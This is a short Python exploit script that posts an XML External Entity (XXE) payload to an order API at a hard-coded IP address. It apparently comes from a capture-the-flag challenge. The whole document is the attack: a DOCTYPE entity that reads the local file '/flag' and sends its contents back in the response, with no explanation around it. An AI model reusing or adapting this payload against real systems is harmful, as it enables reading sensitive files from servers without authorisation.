import requests

url = "http://188.166.174.107:31685/api/order"
headers = {
    "Content-Type": "application/xml",
}

data = '''
<!-- ?xml version="1.0" ?-->
<!DOCTYPE replace [ <!ENTITY Flag SYSTEM "file:///flag" > ]>
<order>
    <food>&Flag;</food>
</order>
'''

r = requests.post(url, data=data, headers=headers)
print(r.text)
